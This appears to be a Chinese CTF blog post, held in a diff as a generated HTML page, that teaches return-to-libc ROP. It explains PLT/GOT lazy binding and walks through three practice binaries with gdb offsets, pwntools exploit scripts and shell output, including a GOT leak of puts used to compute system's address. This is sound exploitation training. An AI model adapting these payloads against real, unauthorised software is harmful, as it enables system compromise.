@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言上一节通过一个简单的ret2syscall题目认识了ROP。本节将通过三道ret2libc题目继续学习ROP。 学习ret2libc题目之前需要对plt和got有一定的了解。 GOT全称Global Offset Table，即全局偏移量表。它在可执行文件中是一个单独的section，位于.data section的前面。每个被目标模块引用的全局符号（函数或者变量）都对应于GOT中一个8字节的">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP学习II">
+<meta property="og:url" content="elssm.github.io/2023/07/13/ROP学习II/index.html">
+<meta property="og:site_name" content="ELSSM&#39;s Blog">
+<meta property="og:description" content="前言上一节通过一个简单的ret2syscall题目认识了ROP。本节将通过三道ret2libc题目继续学习ROP。 学习ret2libc题目之前需要对plt和got有一定的了解。 GOT全称Global Offset Table，即全局偏移量表。它在可执行文件中是一个单独的section，位于.data section的前面。每个被目标模块引用的全局符号（函数或者变量）都对应于GOT中一个8字节的">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="/2023/07/13/ROP学习II/1.png">
+<meta property="og:image" content="/2023/07/13/ROP学习II/2.png">
+<meta property="og:image" content="/2023/07/13/ROP学习II/3.png">
+<meta property="og:image" content="/2023/07/13/ROP学习II/6.png">
+<meta property="og:image" content="/2023/07/13/ROP学习II/4.png">
+<meta property="og:image" content="/2023/07/13/ROP学习II/5.png">
+<meta property="og:image" content="/2023/07/13/ROP学习II/8.png">
+<meta property="og:image" content="/2023/07/13/ROP学习II/7.png">
+<meta property="og:image" content="/2023/07/13/ROP学习II/9.png">
+<meta property="og:updated_time" content="2023-10-09T12:53:52.584Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ROP学习II">
+<meta name="twitter:description" content="前言上一节通过一个简单的ret2syscall题目认识了ROP。本节将通过三道ret2libc题目继续学习ROP。 学习ret2libc题目之前需要对plt和got有一定的了解。 GOT全称Global Offset Table，即全局偏移量表。它在可执行文件中是一个单独的section，位于.data section的前面。每个被目标模块引用的全局符号（函数或者变量）都对应于GOT中一个8字节的">
+<meta name="twitter:image" content="/2023/07/13/ROP学习II/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="elssm.github.io/2023/07/13/ROP学习II/">
+
+
+
+
+
+  <title>ROP学习II | ELSSM's Blog</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ELSSM's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="elssm.github.io/2023/07/13/ROP学习II/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Elssm">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/author2.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ELSSM's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ROP学习II</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-07-13T14:24:14+08:00">
+                2023-07-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>上一节通过一个简单的<code>ret2syscall</code>题目认识了ROP。本节将通过三道<code>ret2libc</code>题目继续学习ROP。</p>
+<p>学习<code>ret2libc</code>题目之前需要对<code>plt</code>和<code>got</code>有一定的了解。</p>
+<p>GOT全称<code>Global Offset Table</code>，即全局偏移量表。它在可执行文件中是一个单独的section，位于<code>.data</code> section的前面。每个被目标模块引用的全局符号（函数或者变量）都对应于GOT中一个8字节的条目。编译器还为GOT中每个条目生成一个重定位记录。在加载时，动态链接器会重定位GOT中的每个条目，使得它包含正确的目标地址。</p>
+<p>PLT全称<code>Procedure Linkage Table</code>，即过程链接表。它在可执行文件中也是一个单独的section，位于<code>.text</code>section的前面。每个被可执行程序调用的库函数都有它自己的PLT条目。每个条目实际上都是一小段可执行的代码。</p>
+<p>通过下图说明。当第一次调用func函数时。会跳转到该函数对应的PLT处。该函数对应的PLT第一条指令执行它对应的.GOT.PLT里的指令。第一次调用时，该函数的.GOT.PLT里保存的是它对应的PLT里第二条指令的地址；继续执行PLT第二条、第三条指令，其中第三条指令作用是跳转到公共的PLT（.PLT[0]）。 公共的PLT（.PLT[0]）执行.GOT.PLT[2]指向的代码，也就是执行动态链接器的代码；动态链接器里的<code>_dl_runtime_resolve_avx</code>函数修改被调函数对应的.GOT.PLT里保存的地址，使之指向链接后的动态链接库里该函数的实际地址；再次调用该函数对应的PLT第一条指令，跳转到它对应的.GOT.PLT里的指令（此时已经是该函数在动态链接库中的真正地址），从而实现该函数的调用。</p>
+<p><img src="/2023/07/13/ROP学习II/1.png" alt="1"></p>
+<h4 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h4><p>本题需要通过gets函数溢出，利用程序中的<code>system</code>函数和<code>/bin/sh</code>字符串获取权限。</p>
+<p>通过<code>strings</code>判断程序中是否存在<code>system</code>函数和<code>/bin/sh</code>字符串。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop# strings ret2libc1 | grep system</span><br><span class="line">system</span><br><span class="line">system@@GLIBC_2.0</span><br><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop# strings ret2libc1 | grep /bin/sh</span><br><span class="line">/bin/sh</span><br></pre></td></tr></table></figure>
+<p>检查保护，发现开启了NX防护，这意味着我们不能在堆栈中执行shellcode。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">'/root/pwn/rop/ret2libc1'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure>
+<p>程序反汇编如下</p>
+<p><img src="/2023/07/13/ROP学习II/2.png" alt="2"></p>
+<p>这里我们的具体方法是，通过gets函数传参数溢出。使得<code>main</code>函数能够return到<code>system</code>函数的地址，并将<code>/bin/sh</code>字符串地址传入到<code>system</code>函数中。</p>
+<p>那么如何获取<code>system</code>函数和<code>/bin/sh</code>字符串在程序中的地址呢？</p>
+<p>我们可以通过程序获取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">[*] <span class="string">'/root/pwn/rop/ret2libc1'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.plt[<span class="string">"system"</span>]</span><br><span class="line"><span class="number">134513760</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">134513760</span>)</span><br><span class="line"><span class="string">'0x8048460'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(elf.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"><span class="number">134514464</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">134514464</span>)</span><br><span class="line"><span class="string">'0x8048720'</span></span><br></pre></td></tr></table></figure>
+<p>接着我们通过gdb动态调试计算需要溢出的数据大小。通过<code>stack</code>命令查看eax到ebp的距离。</p>
+<p><img src="/2023/07/13/ROP学习II/3.png" alt="3"></p>
+<p>需要溢出的数据大小为<code>0xffffd5b8 - 0xffffd54c</code>再加上四字节ebp一共112字节。</p>
+<p>ROP链构造如下</p>
+<p><img src="/2023/07/13/ROP学习II/6.png" alt="6"></p>
+<p>之后我们可以构造exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x8048460</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">112</span> + p32(system_plt) + <span class="string">b'B'</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>执行程序获取shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop<span class="comment"># python3 exp_ret2libc1.py</span></span><br><span class="line">[+] Starting local process <span class="string">'./ret2libc1'</span>: pid <span class="number">16491</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line">$ pwd</span><br><span class="line">/root/pwn/rop</span><br></pre></td></tr></table></figure>
+<h4 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h4><p>本题和<code>ret2libc1</code>的区别是，程序中没有<code>/bin/sh</code>，需要我们自己将<code>/bin/sh</code>字符串写入到程序中进行控制。</p>
+<p>通过反汇编查看我们应该将<code>/bin/sh</code>写入到bss段的<code>buf2</code>中。</p>
+<p><img src="/2023/07/13/ROP学习II/4.png" alt="4"></p>
+<p>所以我们的思路是首先ROP到gets函数，在gets函数中将<code>/bin/sh</code>读取并放入<code>buf2</code>。之后继续ROP到<code>system@plt</code>即可。</p>
+<p>ROP链构造如下</p>
+<p><img src="/2023/07/13/ROP学习II/5.png" alt="5"></p>
+<p>exp构造如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">buf2 = elf.symbols[<span class="string">"buf2"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="number">112</span>*<span class="string">b'A'</span> + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/sh\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h4><p>本题程序中没有<code>system</code>函数也没有<code>/bin/sh</code>字符串，但是提供了<code>so</code>文件。对于<code>/bin/sh</code>字符串我们可以用前面的方法写入，但system函数是无法写入的。</p>
+<p>然而在linux延迟绑定机制中，当程序调用库函数时，会将<code>libc.so</code>文件中的函数地址写到程序的got表中，调用时会跳转到got表所写的地址。那么我们如果要调用system函数，就要知道他的got表中的地址，got表中的地址指的就是当系统将libc（动态链接库）加载到内存中时，库中的函数的地址。但libc被加载到的内存的位置是随机的，我们无从得知。<br>但是，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址，即got表地址。<br>这里我们拥有一个puts函数，我们可以用puts函数，将一个已经执行过的函数的got表地址打印出来，然后再根据地址获取libc版本，确定偏移，得到真实地址。</p>
+<p><img src="/2023/07/13/ROP学习II/8.png" alt="8"></p>
+<p>首先strings看一下程序中的<code>/bin/sh</code>字符串，没有找到<code>/bin/sh</code>字符串，可以用<code>sh</code>代替，效果是一样的。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop/ret2libc3# strings ret2libc3 | grep /bin/sh</span><br><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop/ret2libc3# strings ret2libc3 | grep sh</span><br><span class="line">fflush</span><br><span class="line">.shstrtab</span><br><span class="line">.gnu.hash</span><br><span class="line">fflush@@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+<p>因此ROP链构造如下</p>
+<p><img src="/2023/07/13/ROP学习II/7.png" alt="7"></p>
+<p>溢出数据大小通过反编译查看，得到大小为<code>56+4=60</code>字节</p>
+<p><img src="/2023/07/13/ROP学习II/9.png" alt="9"></p>
+<p>接着我们需要知道<code>system</code>函数在程序中的真实地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.23.so"</span>)</span><br><span class="line">system@plt address  = libc.symbols[<span class="string">"system"</span>] - libc.symbols[<span class="string">"puts"</span>] + puts_plt</span><br></pre></td></tr></table></figure>
+<p>最终exp构造如下构造如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>) <span class="comment">#通过ldd找到程序在本机的libc地址</span></span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str(elf.got[<span class="string">"puts"</span>])) <span class="comment">#传入的是字符串</span></span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>)</span><br><span class="line">puts_plt = int(io.recvuntil(<span class="string">b"\n"</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) <span class="comment">#得到puts函数的真实地址</span></span><br><span class="line">success(<span class="string">"puts_plt -&gt; &#123;:#x&#125;"</span>.format(puts_plt))</span><br><span class="line">payload = flat(cyclic(<span class="number">60</span>),puts_plt+libc.symbols[<span class="string">"system"</span>]-libc.symbols[<span class="string">"puts"</span>],<span class="number">0xdeadbeef</span>,next(elf.search(<span class="string">b"sh\x00"</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.bilibili.com/video/BV1854y1y7Ro" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1854y1y7Ro</a></p>
+<p><a href="https://www.freebuf.com/articles/web/283330.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/283330.html</a></p>
+<p><a href="https://luomuxiaoxiao.com/?p=578" target="_blank" rel="noopener">https://luomuxiaoxiao.com/?p=578</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/05/09/读书分享IV/" rel="next" title="读书分享IV">
+                <i class="fa fa-chevron-left"></i> 读书分享IV
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/08/27/读书分享V/" rel="prev" title="读书分享V">
+                读书分享V <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/author2.png" alt="Elssm">
+            
+              <p class="site-author-name" itemprop="name">Elssm</p>
+              <p class="site-description motion-element" itemprop="description">Web/Cloud/ML Security  Adversarial Training</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">86</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/elssm" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://leetcode.cn/u/elssm/" target="_blank" title="Leetcode">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Leetcode</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2libc1"><span class="nav-number">2.</span> <span class="nav-text">ret2libc1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2libc2"><span class="nav-number">3.</span> <span class="nav-text">ret2libc2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2libc3"><span class="nav-number">4.</span> <span class="nav-text">ret2libc3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Elssm</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a></div>
+
+
+
+<span id="busuanzi_container_site_pv" class="theme-info">
+&nbsp;&nbsp;|&nbsp;&nbsp;本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  </span>
+  <span id="busuanzi_container_site_uv" class="theme-info">
+&nbsp;&nbsp;|&nbsp;&nbsp;本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  </span>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
